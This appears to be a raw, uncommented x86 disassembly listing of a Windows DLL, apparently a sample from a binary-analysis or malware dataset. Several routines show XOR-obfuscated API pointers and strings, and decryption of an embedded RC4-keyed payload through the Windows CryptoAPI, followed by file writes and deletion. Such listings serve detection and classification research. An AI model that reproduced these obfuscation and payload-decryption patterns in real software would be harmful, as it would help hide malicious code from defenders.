add esp 0x8
mov esi ebx
mov [ ebp - 0x30c ] ebx
cmp ebx edi
je r-xdata
mov eax esi
sub eax edi
push eax
push edi
push ebx
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x260 ] 0xf
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] 0x0
call sub_1004efe0
lea ecx [ ebp - 0x274 ]
lea edi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x3
call sub_1006ed90
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x260 ] 0x10
jb r-xdata
lea esi [ ebp - 0x2f8 ]
call sub_1002fbb0
test ebx ebx
je r-xdata
lea edx [ ebp - 0x2f8 ]
push edx
mov ecx esi
call sub_10009d10
add esp 0x4
test eax eax
jne r-xdata
push 0x1
lea edi [ esi + 0x1 ]
push edi
lea edx [ ebp - 0x2fc ]
push edx
mov ecx ebx
call sub_100075f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x274 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x308 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov esi ebx
cmp ebx edi
je r-xdata
add esi 0x1c
mov [ ebp - 0x30c ] esi
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x300 ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx 0x25
lea ebx [ ebp - 0x258 ]
call sub_1002cb70
mov eax ebx
add esp 0x8
lea edx [ eax + 0x2 ]
push ebx
call sub_100187af
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x258 ]
push edx
lea ecx [ ebp - 0x2f8 ]
call sub_1005ddc0
mov al [ ebp - 0x2fc ]
mov esi [ ebp - 0x308 ]
mov [ ebp - 0x284 ] al
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x2f8 ]
cmp ecx eax
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x314 ] eax
mov [ ebp - 0x310 ] eax
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov ebx ecx
mov ecx [ esi + 0x8 ]
sub ebx edx
cmp eax ecx
jne r-xdata
inc [ ebp - 0x300 ]
mov [ ebp - 0x4 ] 0x2
sub [ esi + 0x4 ] 0xffffff80
inc [ ebp - 0x2fc ]
mov ebx [ ebp - 0x324 ]
mov edi [ ebp - 0x320 ]
mov esi [ ebp - 0x30c ]
lea edi [ ebp - 0x2f8 ]
push r--data
call sub_1000831a
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
and ebx 0xffffff80
add ebx [ esi ]
mov [ ebp - 0x310 ] eax
mov [ ebp - 0x314 ] eax
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x1ffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov edi ebx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push eax
call sub_1003bb10
mov edx ecx
shr edx 0x1
mov edi 0x1ffffff
sub edi edx
cmp edi ecx
jae r-xdata
push ecx
mov ecx esi
call sub_100703d0
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx esi
call sub_100703d0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1005f7e4
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10039e10
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1005f890
push ebp
mov ebp esp
sub esp 0xd8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xd4 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x63
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x36 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xd0 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x48 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xd0 ]
jns r-xdata
lea edx [ ebp - 0xc4 ]
mov [ ebp - 0xc4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x98
call sub_10053240
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0xe
jmp r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0xc0
call sub_10053240
mov eax 0x1
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0xa8
call sub_10053240
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xf7
jmp r-xdata
call sub_10053240
lea edx [ ebp - 0x34 ]
mov eax 0x105
call sub_10053240
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xc4 ]
push eax
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x48
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc4 ] 0x0
mov edx [ edi + 0x18 ]
lea ecx [ ebp - 0xcc ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xcc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x11a
jmp r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0xe4
call sub_10053240
mov esi [ ebp - 0xcc ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xcc ] eax
mov edx [ ebp - 0xcc ]
push edx
call [ SysFreeString@IAT ]
fld [ edi + 0x10 ]
lea eax [ ebp - 0xc8 ]
push eax
push 0x0
push 0x80000000
sub esp 0x8
fstp [ esp ]
mov [ ebp - 0xc8 ] 0x0
call [ VarBstrFromR8@IAT ]
cmp [ ebp - 0xc8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x12f
call sub_10053240
lea edx [ ebp - 0x58 ]
mov eax 0x10e
call sub_10053240
mov esi [ ebp - 0xc8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0xc8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xd8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx [ ebp - 0xd0 ]
push ecx
push eax
call edx
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x41
call sub_10053240
lea edx [ ebp - 0xac ]
mov eax 0xfe
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xd4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc4 ]
test eax eax
je r-xdata
sub_1005fbb8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_10049e41
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_10034a80
push esi
call sub_100187af
pop ecx
sub_1005fc00
push ebp
mov ebp esp
push 0xffffffff
push sub_10088a76
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
call sub_100202e0
lea ebx [ esi + 0x70 ]
mov eax 0x7
xor ecx ecx
xor edx edx
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x10 ] ecx
mov [ ebx ] dx
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x90 ] ecx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ecx
mov [ esi + 0x94 ] ax
mov [ ebp - 0x4 ] 0x1
mov edx edi
mov [ esi + 0xb0 ] ecx
mov eax [ edx + 0x30 ]
cmp eax ecx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x34 ]
mov [ esi + 0xb0 ] eax
push r--data
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp + 0xc ] ecx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push 0x60000000
push ebx
call [ ebp + 0xc ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx ]
mov eax edi
mov edx [ eax + 0x30 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp + 0xc ] ecx
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ rw-data ]
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push ecx
push edi
call [ ebp + 0xc ]
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
call [ ebp + 0xc ]
xor eax eax
cmp [ ebp - 0x10 ] ebx
sete al
mov [ esi + 0x8 ] eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
sar eax 0x1
push eax
push edx
call sub_1005ddc0
jmp r-xdata
mov ecx esi
call sub_1005c930
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
sub_1005fd90
push ebp
mov ebp esp
push 0xffffffff
push sub_100891eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
cmp [ esi + 0xc ] 0x0
mov edi 0x1
je r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x80
call sub_10045930
xor eax eax
mov [ ebp - 0xdc ] ax
mov eax edx
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x2 ]
mov eax edi
cmp [ esi + 0x40 ] 0x0
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0xdc ]
call sub_1005ddc0
lea edx [ ebp - 0xdc ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_100205a0
cmp [ ebp - 0xc8 ] 0x8
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x398 ]
push eax
call ecx
add esp 0x4
test eax eax
jne r-xdata
call sub_10071300
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_100187af
add esp 0x4
mov [ esi + 0xc ] 0x0
xor edi edi
xor edi edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005feb0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
add ecx 0x2
add edx 0x2
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_1005fee9
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1005ff80
push ebp
mov ebp esp
mov edx [ rw-data ]
mov ecx [ edx + 0x10 ]
mov eax [ edx + 0xc ]
push esi
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x10 ]
xor esi esi
cmp ecx esi
jne r-xdata
cmp [ eax ] esi
je r-xdata
cmp ecx 0x2
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
mov [ eax + 0x4 ] ecx
mov eax ecx
pop esi
pop ebp
retn
mov [ eax + 0x4 ] edx
mov eax edx
pop esi
pop ebp
retn
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
cmp ecx esi
jle r-xdata
mov [ eax + 0x4 ] esi
mov eax esi
pop esi
pop ebp
retn
sub ecx edx
mov edx [ eax + 0x4 ]
add edx ecx
je r-xdata
mov esi [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
add esi ecx
cmp esi edx
jae r-xdata
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
sub_10060020
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
call edx
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_10060060
push ebp
mov ebp esp
push 0xffffffff
push sub_10086560
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_1004d880
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_100601f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087aa0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_1000ee60
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_100649e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1001a2f0
test eax eax
jne r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_10049da0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x1
call sub_100649e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1001a2f0
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_1005e270
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_100649e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x2 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1001a2f0
test eax eax
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
lea esi [ ebp - 0x48 ]
mov edx ebx
call sub_100427d0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_100649e0
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
lea eax [ edi + 0x3 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x48 ]
push eax
call sub_100187af
add esp 0x4
sub_10060367
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10012e51
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10060388
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_1007fc10
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_100603a8
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] 0x3e8
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0x4 ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
push 0x4
push [ esi ]
mov [ ebp + 0x10 ] ebx
lea ebx [ ebp + 0x10 ]
call sub_1002e8d0
pop ecx
pop ecx
push [ ebp + 0x10 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push [ ebp + 0x10 ]
mov ebx eax
mov eax [ esi ]
add eax 0x4
push eax
call sub_1002e8d0
mov eax [ ebp + 0x10 ]
pop ecx
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push 0x0
push 0x0
push eax
push ebx
push [ ebp - 0x4 ]
lea edi [ eax + 0x4 ]
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0x4 ]
push eax
call sub_100375b7
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
xor ebx ebx
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
push [ ebp - 0xc ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0xc ] ebx
lea eax [ ebp - 0x10 ]
push eax
push 0x800000
push [ ebp - 0xc ]
push 0x6801
push [ ebp - 0x4 ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ebx [ esi ]
sub eax edi
push eax
lea eax [ ebx + edi ]
push eax
call sub_1002e8d0
mov eax [ ebp + 0xc ]
sub [ eax ] edi
pop ecx
pop ecx
xor ebx ebx
jmp r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x10 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x4 ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] bl
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x8 ]
mov ebx edi
push eax
call sub_1002e8d0
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp + 0x13 ]
push edi
push 0x0
push eax
push 0x0
push [ ebp - 0x10 ]
call [ CryptDecrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x14 ]
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
push edi
call sub_1002e8d0
push [ ebp - 0x8 ]
mov ebx edi
call sub_10064fa0
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
sub_100605e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086f83
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov edx 0x7
xor ecx ecx
xor esi esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x10 ] ecx
mov [ ebp - 0x6c ] eax
mov [ eax ] si
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x1c ] dx
push ecx
push ecx
push 0xffffffff
push edi
push ecx
mov [ ebp - 0x4 ] 0x1
push ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] 0x1
call [ MultiByteToWideChar@IAT ]
